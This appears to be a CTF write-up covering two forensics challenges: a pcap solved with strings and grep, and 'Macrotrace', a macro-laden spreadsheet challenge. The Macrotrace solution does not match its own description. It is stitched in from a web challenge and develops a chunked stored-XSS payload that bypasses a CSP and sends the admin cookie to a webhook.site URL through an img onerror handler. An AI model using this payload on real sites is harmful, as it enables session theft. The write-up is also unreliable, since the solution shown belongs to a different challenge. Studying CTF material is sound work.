# Forensics
## No Updates
**Solvers:** 371 <br>
**Author:** umass-ctf

### Description
I don't believe in updating my computer, it just takes so long! Besides, no one could ever hack me, I use good passwords! <br>
Files: [chall.pcapng](https://storage.googleapis.com/umassctf25-challs-static-assets-new/forensics/NoUpdates/static/chall.pcapng)

### Solution
The challenge provide us a pcap file (network capture) for analysis. <br>
The challenge name "No Updates" and the user's statement about not updating their computer hints at a vulnerability related to unpatched systems. <br>
But normal, I will try to analysis this file with `wireshark` or `tshark` or whatever tool that can help me to analysis this file. <br>
I use `strings` command to make the output more readable and if can, I will use `grep` to get the flag because it format is `UMASS{...}`. <br>
```bash
➜  No_Updates strings chall.pcapng | grep -i "UMASS" | cat
1UMASS{n07_ag41n_d4mn_y0u_m3t4spl017}
```

Pretty easy right? Just `strings` to see readable output and then `grep` the flag right away. <br>

**Flag:** `UMASS{n07_ag41n_d4mn_y0u_m3t4spl017}`

## Macrotrace
**Solvers:** 161 <br>
**Author:** umass-ctf

### Description
A suspicious spreadsheet surfaced from the archive of a defunct Flash game studio. Opening it does... something, but whatever was there is now gone. <br>
Your mission: reverse the macro, trace what it did, and recover the flag it tried to destroy. <br>
Use `23ab3Y9/]jKl` as the password when extracting the password-protected zip archive. <br>
Files: [macrotrace-assets.zip](https://storage.googleapis.com/umassctf25-challs-static-assets-new/forensics/macrotrace/static/macrotrace-assets.zip)

### Solution
When extracting the zip file, we have two files:
- `dropper.xlsm` (Excel file with macros)
- `flash.evtx` (Windows Event Log)

I saw that the admin route sets the flag in the cookie and the notes are wrapped in `<li>` tags in the `app.js` file. <br>
When create note, it only limit 16 characters and also there is a CSP policy that block all default sources and all network connections. <br>
```html
<meta
  http-equiv="Content-Security-Policy"
  content="defaul-src 'none';
  connect-src 'none';" />
```

Okay, so let's try `alert()` first to see what happen. If we try normal `alert()` payload, it will not work due to length limit. <br>
But when inject these:
```text
<li><img src=x id="</li>
<li>" onerror="a='</li>
<li>';alert()">"</li>
```

It will work and the reason is that we use the string encapsulation to escape the `<li>` tags. <br>
```text
" onerror="a='     // Opens a string
[HTML tags]        // Gets wrapped in string
';alert()"         // Closes string and executes code
```

When the browser processing: <br>
```text
a='</li><li>'      // The HTML tags become string content
;alert()           // Code executes after string operation
```

Now let's exploit to bring the flag outside our webhook. Because of the CSP configuration:
```text
fetch(webhook_url + cookie);      // Blocked by connect-src
new Image().src = webhook_url;    // Blocked by default-src
```

The reason for second payload above does not working is that it block to external domain. So if we try local domain, it will work. <br>
```text
new Image().src = "http://127.0.0.1:3000/";
```

For this exploit, we use `this.src = webhook_url + cookie;` <br>
Which will bypass the CSP policy:
1. It modifies existing element's property
2. Not creating new connection directly
3. Browser handles the request natively

But the length limit is still a problem. So we need break our webhook into small chunks and use this pattern `';b+='...';a='` to escape the `<li>` tags. <br>
```text
// Setup img tag
<img src=x id="           // 14 chars
" onerror="a=\'          // 14 chars

// Build webhook URL
\';b=\'https:\';a=\'     // 16 chars - initialize b
\';b+=\'//web\';a=\'     // 16 chars
\';b+=\'hook.\';a=\'     // 16 chars
\';b+=\'site/\';a=\'     // 16 chars
...
\';b+=\'3/\';a=\'        // 16 chars

// Get and send cookie
\';i=cookie;a=\'         // 16 chars
\';z=b+i;a=\'           // 16 chars
\';this.src=z;a=\'      // 16 chars
\';">"                   // 6 chars
```

```text
<li>" onerror="a='</li><li>';b+='https:';a='</li>
```
